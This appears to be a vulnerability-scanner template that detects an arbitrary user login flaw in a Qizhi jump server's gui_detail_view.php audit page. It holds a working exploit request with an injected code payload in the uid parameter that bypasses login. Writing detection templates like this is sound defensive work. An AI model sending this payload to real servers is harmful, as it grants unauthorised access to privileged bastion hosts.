id: qizhi-jump-server-gui-detail-view-any-user-login
info:
  name: Qizhi Jump Server gui_detail_view.php Arbitrary User Login Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: unauthorized-access,high-impact
http:
  - raw:
      - |
        GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "错误的id"
          - "事件审计"
          - "审计管理员"
        part: body
